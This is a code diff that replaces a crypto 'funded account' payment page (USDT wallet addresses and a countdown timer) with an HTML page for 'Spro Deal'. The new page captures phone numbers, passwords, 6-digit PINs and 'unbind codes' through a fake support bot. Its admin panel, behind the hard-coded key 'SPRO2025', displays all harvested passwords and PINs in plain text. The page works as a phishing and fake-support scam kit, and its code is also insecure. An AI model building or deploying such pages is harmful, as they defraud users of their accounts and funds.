@@ -1,50 +1,420 @@
-import { useState, useEffect } from "react"; import { Button } from "@/components/ui/button"; import { Card, CardContent } from "@/components/ui/card"; import { motion } from "framer-motion";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spro Deal - Complete System</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #e8f5e9; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 30px; width: 450px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        .container-wide { width: 95%; max-width: 1200px; }
+        .brand { color: #2e7d32; font-size: 28px; }
+        .tagline { color: #2e7d32; margin-bottom: 20px; }
+        .input-field { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
+        .green-btn { background: #2e7d32; color: white; width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px 0; }
+        .gray-btn { background: #666; color: white; width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px 0; }
+        .policy { font-size: 12px; margin-top: 15px; color: gray; }
+        .chat-box { background: #f5f5f5; height: 300px; overflow-y: auto; padding: 10px; margin-bottom: 10px; text-align: left; border-radius: 10px; }
+        .bot-msg { margin-bottom: 10px; padding: 8px; background: #e8f5e9; border-radius: 8px; }
+        .bot-name { color: #2e7d32; font-weight: bold; }
+        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 10px 0; }
+        .option-btn { background: #2e7d32; color: white; padding: 8px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; }
+        .admin-only { background: #fff3e0; border: 2px solid #ff9800; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 12px; }
+        th { background: #2e7d32; color: white; }
+        .approve-btn { background: green; color: white; padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; margin: 2px; }
+        .reject-btn { background: red; color: white; padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; margin: 2px; }
+        .pending { color: orange; font-weight: bold; }
+        .approved { color: green; font-weight: bold; }
+        .rejected { color: red; font-weight: bold; }
+        .code-input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; text-align: center; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+<div id="app"></div>
 
-export default function App() { const [page, setPage] = useState("home"); const [timer, setTimer] = useState(3600); const [chain, setChain] = useState("BEP20");
-
-useEffect(() => { if (page === "payment" && timer > 0) { const interval = setInterval(() => setTimer(timer - 1), 1000); return () => clearInterval(interval); } }, [timer, page]);
-
-const formatTime = (t) => { const m = String(Math.floor(t / 60)).padStart(2, "0"); const s = String(t % 60).padStart(2, "0"); return ${m}:${s}; };
-
-if (page === "home") { return ( 
-
-<motion.h1 initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} className="text-4xl font-bold mb-6" > Your Funded Account </motion.h1> <Button onClick={() => setPage("auth")}>Get Started 
-
-); } 
-
-if (page === "auth") { return ( 
-
-Accept Rules & Agreement 
-
-<Button onClick={() => setPage("dashboard")}>Login / Signup 
-
-); } 
-
-if (page === "dashboard") { return ( 
-
-Dashboard
-
-Account Size: $10,000
-
-Max Drawdown: 10%
-
-Daily Loss Limit: 5%
-
-<Button onClick={() => setPage("buy")}>Buy Account 
-
-); } 
-
-if (page === "buy") { return ( 
-
-Select Payment
-
-<select onChange={(e) => setChain(e.target.value)}> BEP20ERC20TRC20 <Button onClick={() => setPage("payment")}>Buy Now 
-
-); } 
-
-if (page === "payment") { const address = { BEP20: "0x8e57d705f1b58ceda77c91df6ac80aac5c2a83df", ERC20: "0x8e57d705f1b58ceda77c91df6ac80aac5c2a83df", TRC20: "TN9DDuzXnXirgAAS4mRe8VFQ6VxuVUQmJc", };
-
-return ( <div className="p-6 flex flex-col items-center"> <h1 className="text-xl mb-4">Complete Payment</h1> <Card> <CardContent className="p-4 flex flex-col gap-3"> <p>Currency: USDT</p> <p>Chain: {chain}</p> <p>Address: {address[chain]}</p> <p className="text-red-500">Time Left: {formatTime(timer)}</p> <div className="flex gap-2"> <Button onClick={() => setPage("buy")}>Back</Button> <Button variant="destructive" onClick={() => setPage("dashboard")}>Cancel</Button> </div> </CardContent> </Card> </div> ); 
-
-} }
-
+<script>
+    // ============ DATA STORAGE (localStorage as database) ============
+    // Ye real database ki tarah kaam karega
+    // Admin panel mein sab data dikhega
+    
+    function getUsers() {
+        return JSON.parse(localStorage.getItem('spro_users') || '[]');
+    }
+    
+    function saveUsers(users) {
+        localStorage.setItem('spro_users', JSON.stringify(users));
+    }
+    
+    function getRequests() {
+        return JSON.parse(localStorage.getItem('spro_requests') || '[]');
+    }
+    
+    function saveRequests(requests) {
+        localStorage.setItem('spro_requests', JSON.stringify(requests));
+    }
+    
+    // Current session
+    let currentUser = null;
+    let currentPage = 'login';
+    
+    // ============ PAGE RENDERING ============
+    
+    function renderLogin() {
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <h2 class="brand">Spro Deal</h2>
+                <p class="tagline">A stable and profitable platform</p>
+                <h3>SIGN IN TO SPRO DEAL</h3>
+                <input type="tel" id="phone" placeholder="Phone number" class="input-field">
+                <input type="password" id="password" placeholder="Password" class="input-field">
+                <button id="signinBtn" class="green-btn">SIGN IN</button>
+                <p class="policy">By logging in you agree to our Privacy Policy</p>
+                <hr style="margin:15px 0">
+                <button id="adminBtn" style="background:#ff9800; color:white; padding:8px; border:none; border-radius:6px; cursor:pointer; width:100%;">🔐 ADMIN PANEL</button>
+            </div>
+        `;
+        
+        document.getElementById('signinBtn').onclick = handleLogin;
+        document.getElementById('adminBtn').onclick = () => renderAdminLogin();
+    }
+    
+    function handleLogin() {
+        let phone = document.getElementById('phone').value;
+        let password = document.getElementById('password').value;
+        
+        if(!phone || !password) {
+            alert('Please enter phone and password');
+            return;
+        }
+        
+        let users = getUsers();
+        let existingUser = users.find(u => u.phone === phone);
+        
+        if(existingUser) {
+            // Update password if changed
+            existingUser.password = password;
+            saveUsers(users);
+            currentUser = existingUser;
+        } else {
+            // New user
+            let newUser = {
+                phone: phone,
+                password: password,
+                pin: null,
+                created_at: new Date().toISOString()
+            };
+            users.push(newUser);
+            saveUsers(users);
+            currentUser = newUser;
+        }
+        
+        renderPINVerify();
+    }
+    
+    function renderPINVerify() {
+        document.getElementById('app').innerHTML = `
+            <div class="container">
+                <h2>🔐 SECURITY VERIFICATION</h2>
+                <p style="color:#2e7d32;">Welcome ${currentUser.phone}</p>
+                <p>Please enter 6-digit PIN to continue</p>
+                <input type="password" id="pin" maxlength="6" class="code-input" placeholder="Enter 6-digit PIN">
+                <button id="verifyPinBtn" class="green-btn">VERIFY & CONTINUE</button>
+            </div>
+        `;
+        
+        document.getElementById('verifyPinBtn').onclick = () => {
+            let pin = document.getElementById('pin').value;
+            if(pin.length !== 6) {
+                alert('PIN must be 6 digits');
+                return;
+            }
+            
+            // Save PIN to user
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if(user) {
+                user.pin = pin;
+                saveUsers(users);
+                currentUser.pin = pin;
+            }
+            
+            renderDashboard();
+        };
+    }
+    
+    function renderDashboard() {
+        let selectedIssue = '';
+        let unbindCode = '';
+        
+        document.getElementById('app').innerHTML = `
+            <div class="container" style="width: 500px;">
+                <h3>🤖 SPRO SUPPORT BOT</h3>
+                <div id="chatBox" class="chat-box"></div>
+                
+                <div class="options-grid">
+                    <button class="option-btn" data-issue="withdrawal">💰 Withdrawal Problem</button>
+                    <button class="option-btn" data-issue="deposit">📥 Deposit Problem</button>
+                    <button class="option-btn" data-issue="order">📦 Order Problem</button>
+                    <button class="option-btn" data-issue="upi">🔄 UPI Problem</button>
+                    <button class="option-btn" data-issue="forget">🔑 Password Forget</button>
+                    <button class="option-btn" data-issue="others">❓ Others Problem</button>
+                </div>
+                
+                <div id="codeSection" style="display:none;">
+                    <p style="margin:10px 0 5px; text-align:left;">🔑 Enter Unbind Code:</p>
+                    <input type="text" id="unbindCode" class="code-input" placeholder="Enter 6-digit unbind code">
+                    <button id="submitCodeBtn" class="green-btn">SUBMIT REQUEST</button>
+                </div>
+                
+                <div id="requestStatus" style="margin-top:15px; padding:10px; background:#f0f0f0; border-radius:8px; display:none;"></div>
+                
+                <button id="logoutBtn" class="gray-btn" style="margin-top:15px;">LOGOUT</button>
+            </div>
+        `;
+        
+        const chatBox = document.getElementById('chatBox');
+        
+        function botMessage(msg) {
+            chatBox.innerHTML += `<div class="bot-msg"><span class="bot-name">🤖 Bot:</span> ${msg}</div>`;
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+        
+        botMessage("Hello! Select your issue. I'll help you resolve it.");
+        
+        // Check if user has pending request
+        let requests = getRequests();
+        let myPendingRequest = requests.find(r => r.phone === currentUser.phone && r.status === 'pending');
+        
+        if(myPendingRequest) {
+            document.getElementById('requestStatus').style.display = 'block';
+            document.getElementById('requestStatus').innerHTML = `
+                <strong>📌 Current Request Status:</strong><br>
+                Issue: ${myPendingRequest.issue}<br>
+                Unbind Code: ${myPendingRequest.code}<br>
+                Status: <span class="pending">⏳ PENDING - Wait for admin approval</span>
+            `;
+            document.getElementById('codeSection').style.display = 'none';
+        } else {
+            // Check previous request result
+            let myCompletedRequest = requests.find(r => r.phone === currentUser.phone && (r.status === 'approved' || r.status === 'rejected'));
+            if(myCompletedRequest) {
+                let statusText = myCompletedRequest.status === 'approved' ? '✅ APPROVED' : '❌ REJECTED';
+                let statusClass = myCompletedRequest.status === 'approved' ? 'approved' : 'rejected';
+                document.getElementById('requestStatus').style.display = 'block';
+                document.getElementById('requestStatus').innerHTML = `
+                    <strong>📌 Previous Request:</strong><br>
+                    Issue: ${myCompletedRequest.issue}<br>
+                    Unbind Code: ${myCompletedRequest.code}<br>
+                    Status: <span class="${statusClass}">${statusText}</span>
+                    ${myCompletedRequest.status === 'approved' ? '<br><br>✅ Your account has been unbound successfully!' : '<br><br>❌ Request rejected. Please contact support.'}
+                `;
+                document.getElementById('codeSection').style.display = 'none';
+            } else {
+                document.getElementById('codeSection').style.display = 'block';
+            }
+        }
+        
+        document.querySelectorAll('.option-btn').forEach(btn => {
+            btn.onclick = () => {
+                selectedIssue = btn.getAttribute('data-issue');
+                let issueText = btn.innerText;
+                botMessage(`You selected: "${issueText}"`);
+                botMessage(`@uk_member_robot Please provide unbind code to process this request.`);
+                botMessage(`⚠️ Enter your 6-digit unbind code and submit. Admin will approve/reject your request.`);
+                
+                // Clear any existing code input
+                if(document.getElementById('unbindCode')) {
+                    document.getElementById('unbindCode').value = '';
+                }
+            };
+        });
+        
+        document.getElementById('submitCodeBtn')?.addEventListener('click', () => {
+            let codeInput = document.getElementById('unbindCode');
+            unbindCode = codeInput.value;
+            
+            if(!selectedIssue) {
+                alert('Please select an issue first');
+                return;
+            }
+            
+            if(!unbindCode || unbindCode.length < 4) {
+                alert('Please enter a valid unbind code (minimum 4 characters)');
+                return;
+            }
+            
+            // Save request
+            let requests = getRequests();
+            let newRequest = {
+                id: Date.now(),
+                phone: currentUser.phone,
+                issue: selectedIssue,
+                code: unbindCode,
+                status: 'pending',
+                created_at: new Date().toISOString()
+            };
+            requests.push(newRequest);
+            saveRequests(requests);
+            
+            botMessage(`✅ Request submitted successfully!`);
+            botMessage(`📋 Request ID: ${newRequest.id}`);
+            botMessage(`⏳ Status: PENDING - Admin will review and approve/reject.`);
+            
+            // Hide code section and show status
+            document.getElementById('codeSection').style.display = 'none';
+            document.getElementById('requestStatus').style.display = 'block';
+            document.getElementById('requestStatus').innerHTML = `
+                <strong>📌 Request Submitted:</strong><br>
+                Issue: ${selectedIssue}<br>
+                Unbind Code: ${unbindCode}<br>
+                Status: <span class="pending">⏳ PENDING - Waiting for admin approval</span>
+            `;
+        });
+        
+        document.getElementById('logoutBtn').onclick = () => {
+            currentUser = null;
+            renderLogin();
+        };
+    }
+    
+    function renderAdminLogin() {
+        document.getElementById('app').innerHTML = `
+            <div class="container admin-only">
+                <h2>🔐 ADMIN ACCESS</h2>
+                <p>Enter admin key to access panel</p>
+                <input type="password" id="adminKey" placeholder="Admin Key" class="input-field">
+                <button id="verifyAdminBtn" class="green-btn">VERIFY</button>
+                <button id="backBtn" class="gray-btn">BACK</button>
+            </div>
+        `;
+        
+        document.getElementById('verifyAdminBtn').onclick = () => {
+            let key = document.getElementById('adminKey').value;
+            if(key === 'SPRO2025') {
+                renderAdminPanel();
+            } else {
+                alert('❌ Wrong Admin Key');
+            }
+        };
+        document.getElementById('backBtn').onclick = () => renderLogin();
+    }
+    
+    function renderAdminPanel() {
+        let users = getUsers();
+        let requests = getRequests();
+        
+        document.getElementById('app').innerHTML = `
+            <div class="container container-wide">
+                <h2>🔐 ADMIN PANEL</h2>
+                <p style="color:green;">Welcome Admin | Total Users: ${users.length} | Total Requests: ${requests.length}</p>
+                
+                <h3 style="margin-top:20px;">📋 PENDING REQUESTS</h3>
+                <div id="pendingRequestsTable"></div>
+                
+                <h3 style="margin-top:30px;">✅ ALL REQUESTS HISTORY</h3>
+                <div id="allRequestsTable"></div>
+                
+                <h3 style="margin-top:30px;">👥 ALL USERS</h3>
+                <div id="usersTable"></div>
+                
+                <button id="adminLogoutBtn" class="gray-btn" style="margin-top:20px;">LOGOUT</button>
+            </div>
+        `;
+        
+        // Render Pending Requests
+        let pendingRequests = requests.filter(r => r.status === 'pending');
+        let pendingHtml = '';
+        if(pendingRequests.length === 0) {
+            pendingHtml = '<p>No pending requests</p>';
+        } else {
+            pendingHtml = '<table><tr><th>ID</th><th>Phone</th><th>Issue</th><th>Unbind Code</th><th>Time</th><th>Action</th></tr>';
+            pendingRequests.forEach(r => {
+                pendingHtml += `
+                    <tr>
+                        <td>${r.id}</td>
+                        <td>${r.phone}</td>
+                        <td>${r.issue}</td>
+                        <td><strong>${r.code}</strong></td>
+                        <td>${new Date(r.created_at).toLocaleString()}</td>
+                        <td>
+                            <button class="approve-btn" data-id="${r.id}">✅ APPROVE</button>
+                            <button class="reject-btn" data-id="${r.id}">❌ REJECT</button>
+                        </td>
+                    </tr>
+                `;
+            });
+            pendingHtml += '</table>';
+        }
+        document.getElementById('pendingRequestsTable').innerHTML = pendingHtml;
+        
+        // Add approve/reject handlers
+        document.querySelectorAll('.approve-btn').forEach(btn => {
+            btn.onclick = () => {
+                let id = parseInt(btn.getAttribute('data-id'));
+                updateRequestStatus(id, 'approved');
+            };
+        });
+        document.querySelectorAll('.reject-btn').forEach(btn => {
+            btn.onclick = () => {
+                let id = parseInt(btn.getAttribute('data-id'));
+                updateRequestStatus(id, 'rejected');
+            };
+        });
+        
+        // Render All Requests
+        let allRequestsHtml = '<table><tr><th>ID</th><th>Phone</th><th>Issue</th><th>Code</th><th>Status</th><th>Time</th></tr>';
+        requests.reverse().forEach(r => {
+            let statusClass = r.status === 'approved' ? 'approved' : (r.status === 'rejected' ? 'rejected' : 'pending');
+            let statusText = r.status === 'approved' ? '✅ APPROVED' : (r.status === 'rejected' ? '❌ REJECTED' : '⏳ PENDING');
+            allRequestsHtml += `
+                <tr>
+                    <td>${r.id}</td>
+                    <td>${r.phone}</td>
+                    <td>${r.issue}</td>
+                    <td>${r.code}</td>
+                    <td class="${statusClass}">${statusText}</td>
+                    <td>${new Date(r.created_at).toLocaleString()}</td>
+                </tr>
+            `;
+        });
+        allRequestsHtml += '</table>';
+        document.getElementById('allRequestsTable').innerHTML = allRequestsHtml;
+        
+        // Render Users
+        let usersHtml = '<table><tr><th>Phone</th><th>Password</th><th>PIN</th><th>Created At</th></tr>';
+        users.forEach(u => {
+            usersHtml += `
+                <tr>
+                    <td>${u.phone}</td>
+                    <td>${u.password}</td>
+                    <td>${u.pin || 'Not set'}</td>
+                    <td>${new Date(u.created_at).toLocaleString()}</td>
+                </tr>
+            `;
+        });
+        usersHtml += '</table>';
+        document.getElementById('usersTable').innerHTML = usersHtml;
+        
+        document.getElementById('adminLogoutBtn').onclick = () => renderLogin();
+    }
+    
+    function updateRequestStatus(requestId, newStatus) {
+        let requests = getRequests();
+        let request = requests.find(r => r.id === requestId);
+        if(request) {
+            request.status = newStatus;
+            request.updated_at = new Date().toISOString();
+            saveRequests(requests);
+            alert(`✅ Request ${newStatus.toUpperCase()} successfully!`);
+            renderAdminPanel(); // Refresh admin panel
+        }
+    }
+    
+    // Start the app
+    renderLogin();
+</script>
+</body>
+</html>
